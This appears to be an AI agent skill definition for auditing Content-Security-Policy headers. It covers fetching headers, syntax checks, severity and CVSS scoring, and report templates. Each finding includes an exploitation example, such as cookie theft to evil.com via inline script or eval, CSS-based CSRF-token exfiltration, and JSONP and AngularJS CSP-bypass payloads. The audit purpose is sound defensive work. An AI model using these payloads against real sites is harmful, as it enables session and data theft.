---
name: content-security-policy
description: Analyze Content-Security-Policy headers for misconfigurations and bypass risks. Use when reviewing CSP from raw strings, URLs, or domains.
disable-model-invocation: true
aliases:
  - csp-review
  - csp-analyzer
  - csp-audit
version: 0.0.1
author: Herman Stevens
tags: [security, csp, headers, web-security, xss-prevention]
allowed-tools: [Bash, WebFetch, Read, Grep, Glob]
---

# Content-Security-Policy Review

Analyze CSP headers and generate security findings with remediation guidance.

**Target:** $ARGUMENTS (raw CSP string, URL, domain, or file path)

## When to Use This Skill

- Reviewing CSP headers on production websites
- Validating CSP before deployment
- Auditing CSP across multiple pages of a domain
- Investigating XSS bypass potential through CSP weaknesses
- Generating recommended CSP for a new application

## Core Capabilities

| Capability | Description |
|------------|-------------|
| Input Detection | Auto-detect raw CSP, URL, domain, or file path |
| Syntax Validation | Validate directives and source values against CSP Level 3 |
| Security Analysis | Detect unsafe patterns, bypasses, and missing directives |
| Strength Scoring | Deduction-based score (A-F) with justification |
| Remediation | Generate recommended CSP with migration steps |

## Workflow

### Phase 1: Input Detection and CSP Retrieval

Detect input type from $ARGUMENTS and retrieve CSP:

**Raw CSP string** (contains directive keywords like `default-src`, `script-src`):
- Parse directly as CSP string

**URL** (starts with `http://` or `https://`):
```bash
curl -sI -L "$URL" | grep -i "content-security-policy"
```

**Domain** (no scheme, no directives):
```bash
# Fetch CSP from homepage
curl -sI -L "https://$DOMAIN" | grep -i "content-security-policy"

# Spider via sitemap
curl -sL "https://$DOMAIN/sitemap.xml" | grep -oP '<loc>\K[^<]+' | head -20
```
For each discovered page, fetch headers. Cap at 20 pages.

If no sitemap exists, extract links from homepage and check up to 20 unique paths.

**File path** (ends with common extensions or exists on disk):
- Read file content and extract CSP string

**Edge cases to handle:**
- No CSP found → report absence, check for `<meta http-equiv="Content-Security-Policy">`
- `Content-Security-Policy-Report-Only` → note it is non-enforcing
- Multiple CSP headers → analyze each; note that browsers intersect them
- Meta-tag CSP → note limitations (no `frame-ancestors`, no `report-uri`, no `sandbox`)

### Phase 2: Parse and Validate Syntax

Split policy on `;` into directives. For each directive:

1. **Validate directive name** against CSP Level 3:

| Fetch Directives | Document Directives | Navigation Directives | Reporting |
|---|---|---|---|
| `default-src` | `sandbox` | `form-action` | `report-uri` |
| `script-src` | `base-uri` | `frame-ancestors` | `report-to` |
| `script-src-elem` | `plugin-types` | `navigate-to` | |
| `script-src-attr` | | | |
| `style-src` | | | |
| `style-src-elem` | | | |
| `style-src-attr` | | | |
| `img-src` | | | |
| `font-src` | | | |
| `connect-src` | | | |
| `media-src` | | | |
| `object-src` | | | |
| `frame-src` | | | |
| `child-src` | | | |
| `worker-src` | | | |
| `manifest-src` | | | |
| `prefetch-src` | | | |

Other valid directives: `upgrade-insecure-requests`, `block-all-mixed-content`, `require-trusted-types-for`, `trusted-types`

2. **Validate source values:**
   - Keywords (must be single-quoted): `'self'`, `'unsafe-inline'`, `'unsafe-eval'`, `'unsafe-hashes'`, `'strict-dynamic'`, `'report-sample'`, `'none'`, `'wasm-unsafe-eval'`
   - Nonces: `'nonce-<base64>'`
   - Hashes: `'sha256-<base64>'`, `'sha384-<base64>'`, `'sha512-<base64>'`
   - Schemes: `https:`, `http:`, `data:`, `blob:`, `mediastream:`, `filesystem:`
   - Hosts: `example.com`, `*.example.com`, `https://example.com`
   - Wildcards: `*`

3. **Detect syntax errors:**
   - Unquoted keywords (`self` instead of `'self'`, `unsafe-inline` instead of `'unsafe-inline'`)
   - Missing semicolons between directives
   - Duplicate directives (second is ignored)
   - Unknown directive names (typos)
   - Invalid nonce/hash format

### Phase 3: Security Evaluation

#### Anti-Pattern Detection

For each finding, explain **why** the configuration is dangerous and provide an **exploitation example** showing how an attacker abuses it.

**CSP-01** | `unsafe-inline` in script-src | **Critical**
Why: Completely defeats CSP's XSS protection. Any injection point becomes exploitable because the browser trusts all inline scripts.
```html
<!-- Attacker injects via reflected/stored XSS: -->
<script>document.location='https://evil.com/?c='+document.cookie</script>
```

**CSP-02** | `unsafe-eval` in script-src | **High**
Why: Allows string-to-code execution. Attackers use `eval()`, `Function()`, `setTimeout(string)`, or `setInterval(string)` to run injected payloads even without inline script tags.
```javascript
// Attacker exploits an injection point that flows into eval:
eval('fetch("https://evil.com/?d="+document.cookie)')
```

**CSP-03** | Wildcard `*` in script-src | **Critical**
Why: Permits script loading from any origin. Attacker hosts payload on any domain they control.
```html
<script src="https://evil.com/steal.js"></script>
```

**CSP-04** | `data:` in script-src | **Critical**
Why: Allows inline script execution via data URIs, bypassing host-based restrictions entirely.
```html
<script src="data:text/javascript,alert(document.domain)"></script>
```

**CSP-05** | `blob:` in script-src | **High**
Why: Attacker creates executable blob URLs from injected inline code, bypassing script-src host allowlists.
```javascript
// If attacker can inject any JS (e.g. via unsafe-eval or JSONP):
var b = new Blob(["alert(document.domain)"], {type:"text/javascript"});
var u = URL.createObjectURL(b);
var s = document.createElement("script"); s.src = u; document.body.appendChild(s);
```

**CSP-06** | Known bypass endpoint allowlisted | **High**
Why: Allowlisted CDNs/APIs often host JSONP endpoints or JavaScript libraries (like AngularJS) that let attackers execute arbitrary code while staying within the CSP allowlist.
```html
<!-- JSONP callback bypass (googleapis.com allowlisted): -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"></script>

<!-- AngularJS sandbox escape (cdnjs.cloudflare.com allowlisted): -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(document.domain)')()}}</div>
```

**CSP-07** | `http:` scheme in any directive | **Medium**
Why: Allows loading resources over unencrypted HTTP. A network attacker (MITM) can inject malicious scripts into HTTP responses.
```
# Attacker on same network intercepts HTTP script load and replaces content:
script-src http://cdn.example.com  →  MITM injects malicious JS in transit
```

**CSP-08** | Overly broad host allowlist | **Medium**
Why: Each additional allowlisted host expands the attack surface. Any XSS, open redirect, or JSONP endpoint on those hosts becomes a CSP bypass vector. More hosts = higher probability one is exploitable.

**CSP-09** | `unsafe-inline` in style-src | **Low**
Why: Enables CSS injection for data exfiltration. Attacker uses attribute selectors to leak sensitive content character-by-character.
```html
<!-- Exfiltrate CSRF token via CSS injection: -->
<style>
input[name="csrf"][value^="a"] { background: url("https://evil.com/?c=a"); }
input[name="csrf"][value^="b"] { background: url("https://evil.com/?c=b"); }
/* ... repeat for each character */
</style>
```

**CSP-10** | `unsafe-hashes` in script-src | **Medium**
Why: Allows execution of specific inline event handlers by hash. If the hashed handler contains injectable content (e.g. from a template), attacker can execute code through that handler.

**CSP-11** | Wildcard subdomain `*.example.com` in script-src | **Medium**
Why: Any subdomain becomes a valid script source. Attacker exploiting XSS on a forgotten subdomain (staging, legacy app, user-generated-content subdomain) can serve scripts that the main site trusts.
```html
<!-- Attacker compromises legacy.example.com and serves: -->
<script src="https://legacy.example.com/evil.js"></script>
```

**CSP-12** | `object-src` allows plugins | **High**
Why: Permits `<object>` and `<embed>` tags to load plugin content. Attacker embeds a malicious Flash SWF or PDF that executes JavaScript in the page context.
```html
<object data="https://evil.com/exploit.swf" type="application/x-shockwave-flash"></object>
```

#### Known CSP Bypass Sources

Flag these allowlisted hosts in script-src (from "CSP Is Dead, Long Live CSP" research):

| Host Pattern | Bypass Type |
|---|---|
| `*.googleapis.com` | JSONP endpoints |
| `*.gstatic.com` | Angular library hosting |
| `*.google.com` | JSONP callbacks |
| `cdnjs.cloudflare.com` | Angular/other framework bypasses |
| `*.jsdelivr.net` | Arbitrary JS hosting |
| `*.unpkg.com` | Arbitrary npm package serving |
| `*.rawgit.com` | Raw GitHub content |
| `*.cloudflare.com` | Various JSONP endpoints |
| `accounts.google.com/gsi/client` | Google Sign-In JSONP |

#### Missing Directive Analysis

| ID | Finding | Severity | Risk | Exploitation |
|----|---------|----------|------|-------------|
| CSP-20 | No `default-src` | High | No fallback; unlisted directives unrestricted | Attacker loads resources from any origin via directives not explicitly set |
| CSP-21 | No `script-src` (no default-src fallback) | Critical | Scripts from any origin | `<script src="https://evil.com/xss.js"></script>` executes freely |
| CSP-22 | No `object-src` | High | Plugin-based XSS | `<object data="//evil.com/exploit.swf">` runs in page context |
| CSP-23 | No `base-uri` | Medium | `<base>` tag hijacking | `<base href="https://evil.com/">` redirects all relative URLs (scripts, forms) to attacker domain |
| CSP-24 | No `frame-ancestors` | Medium | Clickjacking | Attacker iframes the page and overlays transparent UI to trick clicks |
| CSP-25 | No `form-action` | Medium | Form data theft | Attacker injects `<form action="https://evil.com/steal">` to exfiltrate user-submitted data |
| CSP-26 | No `upgrade-insecure-requests` | Low | Mixed content | HTTP sub-resources remain vulnerable to MITM on HTTPS pages |
| CSP-27 | No reporting | Low | No violation visibility | CSP bypasses go undetected; no data to tune policy |
| CSP-28 | No `style-src` (no default-src fallback) | Low | CSS injection | Attacker loads external CSS with attribute selectors to exfiltrate page data |
| CSP-29 | No `img-src` restriction | Low | Data exfiltration | `<img src="https://evil.com/log?data=...">` leaks tokens via URL parameters |

#### Best Practice Assessment

| Practice | Check |
|----------|-------|
| Nonce-based CSP | `script-src` uses `'nonce-...'` instead of allowlists |
| `strict-dynamic` | Present in script-src (propagates trust to loaded scripts) |
| Trusted Types | `require-trusted-types-for 'script'` present |
| Strict `default-src` | Set to `'none'` or `'self'` |
| Reporting enabled | `report-uri` or `report-to` configured |
| Report-Only testing | Uses Report-Only header before enforcing |

#### CSP Level Classification

| Level | Indicator |
|-------|-----------|
| Level 1 | Host-based allowlists only |
| Level 2 | Nonces or hashes present |
| Level 3 | `strict-dynamic`, Trusted Types, `script-src-elem`/`script-src-attr` |

#### CVSS Scoring Reference

Baseline CVSS vectors per finding profile. Adjust based on application context (see adjustment guidance below).

**CVSS 3.1 Profiles**

| Profile | Score | Vector | Findings |
|---------|-------|--------|----------|
| Complete CSP bypass | 9.3 | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` | CSP-01, -03, -04, -21 |
| Conditional CSP bypass | 8.0 | `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N` | CSP-02, -05, -06, -12, -20, -22 |
| Network content injection | 5.3 | `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N` | CSP-07 |
| Policy weakening | 4.7 | `AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N` | CSP-08, -11, -23, -25 |
| UI redress | 4.3 | `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N` | CSP-24 |
| Limited code execution | 4.2 | `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N` | CSP-10 |
| Data leak via CSS/images | 3.1 | `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N` | CSP-09, -28, -29 |
| Hardening recommendation | — | No direct attack path | CSP-26, -27 |

**CVSS 4.0 Profiles** (verify with [FIRST calculator](https://www.first.org/cvss/calculator/4.0))

| Profile | Score | Vector | Findings |
|---------|-------|--------|----------|
| Complete CSP bypass | ~9.2 | `AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N` | CSP-01, -03, -04, -21 |
| Conditional CSP bypass | ~8.3 | `AV:N/AC:H/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N` | CSP-02, -05, -06, -12, -20, -22 |
| Network content injection | ~6.4 | `AV:N/AC:H/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N` | CSP-07 |
| Policy weakening | ~2.3 | `AV:N/AC:H/AT:P/PR:N/UI:P/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N` | CSP-08, -11, -23, -25 |
| UI redress | ~5.1 | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:L/SA:N` | CSP-24 |
| Limited code execution | ~2.1 | `AV:N/AC:H/AT:P/PR:N/UI:P/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N` | CSP-10 |
| Data leak | ~2.1 | `AV:N/AC:H/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N` | CSP-09, -28, -29 |
| Hardening recommendation | — | No direct attack path | CSP-26, -27 |

CVSS 4.0 typically scores lower than 3.1 for conditional findings. Both versions provided for customer compatibility.

**Score Adjustment Guidance:**
- **Known injection point exists:** upgrade AC:H → AC:L (3.1) or AT:P → AT:N (4.0) for conditional findings
- **Internal-only app:** reduce AV to A (Adjacent) if not internet-facing
- **API-only (no browser UI):** reduce impact metrics if session hijacking not applicable
- **High-value target (banking, healthcare):** consider Supplemental metrics in CVSS 4.0

### Phase 4: Strength Scoring

**Start at 100. Deduct per finding:**

| Severity | Deduction per finding |
|----------|----------------------|
| Critical | -25 |
| High | -15 |
| Medium | -5 |
| Low | -2 |

**Bonus points (max +20):**

| Bonus | Points |
|-------|--------|
| Nonce-based script-src | +5 |
| `strict-dynamic` present | +5 |
| Trusted Types enabled | +5 |
| Reporting configured | +3 |
| `upgrade-insecure-requests` | +2 |

**Score interpretation:**

| Grade | Score | Meaning |
|-------|-------|---------|
| A | 90-100 | Strong CSP, minor improvements possible |
| B | 75-89 | Good CSP, some gaps to address |
| C | 50-74 | Moderate CSP, significant weaknesses |
| D | 25-49 | Weak CSP, major risks present |
| F | 0-24 | Ineffective CSP, provides minimal protection |

Floor at 0. Cap at 100.

### Phase 5: Report Generation

**Reporting requirement:** Every finding MUST include:
1. **CVSS scores** — both 3.1 and 4.0 with full vector strings (use reference profiles from Phase 3, adjust per guidance)
2. **Why** the directive/value is dangerous (the specific security property it breaks)
3. **How** an attacker exploits it (concrete HTML/JS payload or attack scenario)
4. **What** to do about it (specific CSP change with example syntax)

Do not report generic risk labels alone. A developer reading the report should understand the exact attack vector without needing to look anything up.

Generate this report structure:

```markdown
# CSP Analysis Report

**Target:** {URL/domain/raw}
**Date:** {date}
**CSP Source:** {Response header | Meta tag | Raw input}
**CSP Level:** {1 | 2 | 3}
**Score:** {score}/100 (Grade {A-F})

## Raw Policy

```
{full CSP string}
```

## Parsed Directives

| Directive | Values |
|-----------|--------|
| default-src | 'self' |
| script-src | 'self' 'unsafe-inline' cdn.example.com |
| ... | ... |

## Findings

### Critical

#### [CSP-01] `unsafe-inline` in script-src
**Directive:** `script-src` | **Value:** `'unsafe-inline'`
**CVSS 3.1:** 9.3 (`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`)
**CVSS 4.0:** ~9.2 (`AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N`)

**Why this is dangerous:** Completely defeats CSP's XSS protection. The browser trusts all inline scripts, so any injection point becomes directly exploitable.

**Exploitation example:**
```html
<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

**Recommendation:** Remove `unsafe-inline`. Use nonce-based CSP (`'nonce-{random}'`) or hash-based CSP (`'sha256-...'`). Add `'strict-dynamic'` to propagate trust to scripts loaded by nonced scripts.

---

{Repeat for each finding per severity tier: High, Medium, Low.
Each finding MUST include: CVSS 3.1 + 4.0 with vectors, Why dangerous, Exploitation example, and Recommendation.}

## Missing Directives

| ID | Directive | Risk | Recommendation |
|----|-----------|------|----------------|
| CSP-22 | object-src | Plugin XSS | Add `object-src 'none'` |

## Best Practices Assessment

| Practice | Status | Notes |
|----------|--------|-------|
| Nonce-based CSP | Missing | Using allowlist-based approach |
| strict-dynamic | Missing | Add for CSP Level 3 |
| ... | ... | ... |

## Recommended CSP

```
default-src 'none'; script-src 'nonce-{random}' 'strict-dynamic'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'; object-src 'none'; upgrade-insecure-requests; report-uri /csp-report
```

## Summary

**Score:** {score}/100 ({grade})

**Key Actions:**
1. {Highest priority fix}
2. {Second priority fix}
3. {Third priority fix}
```

For domain scans with multiple pages, add a comparison table:

```markdown
## Page Comparison

| Page | CSP Present | Score | Key Differences |
|------|-------------|-------|-----------------|
| / | Yes | 72 | Baseline |
| /login | Yes | 65 | Adds unsafe-inline for form |
| /api/docs | No | 0 | No CSP header |
```

## Implementation Steps

1. Detect input type from $ARGUMENTS
2. Retrieve CSP via curl or parse raw string
3. For domains, spider sitemap/homepage (max 20 pages)
4. Split policy into directives and validate syntax
5. Run anti-pattern detection (CSP-01 through CSP-12)
6. Check for missing directives (CSP-20 through CSP-29)
7. Evaluate best practices and classify CSP level
8. Calculate strength score with deductions and bonuses
9. Generate recommended CSP based on findings
10. Output report in markdown format

## Quality Checklist

Before finalizing:
- [ ] All directives validated against CSP Level 3 spec
- [ ] Each finding has ID, severity, CVSS 3.1 + 4.0 vectors, exploitation example, and recommendation
- [ ] Known bypass sources checked against script-src allowlist
- [ ] Score calculation shown with deductions itemized
- [ ] Recommended CSP addresses all critical/high findings
- [ ] Meta-tag limitations noted if applicable
- [ ] Report-Only vs enforcing mode distinguished
- [ ] Multiple CSP headers handled correctly
- [ ] Domain spider capped at 20 pages
- [ ] Syntax errors (unquoted keywords, typos) detected

## Example Usage

**Raw CSP analysis:**
```
/csp-review default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com; style-src 'self' 'unsafe-inline'
```

**Single URL:**
```
/csp-review https://example.com
```

**Domain spider:**
```
/csp-review example.com
```

## References

- [CSP Level 3 Spec](https://www.w3.org/TR/CSP3/)
- [MDN: Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [PortSwigger: CSP Bypass Techniques](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [CSP Is Dead, Long Live CSP (2016)](https://ai.google/research/pubs/pub45542)
- [CWE-1021: Improper Restriction of Rendered UI Layers](https://cwe.mitre.org/data/definitions/1021.html)
- [CWE-693: Protection Mechanism Failure](https://cwe.mitre.org/data/definitions/693.html)
- [CVSS 3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
- [CVSS 4.0 Calculator](https://www.first.org/cvss/calculator/4.0)

## Related Skills

- [Missing Security Headers](../missing-security-headers-anti-pattern/): CSP is one of several critical security headers
- [Cross-Site Scripting (XSS)](../xss-anti-pattern/): CSP is a primary XSS defense layer
- [DOM Clobbering](../dom-clobbering-anti-pattern/): Trusted Types (CSP L3) mitigates DOM clobbering
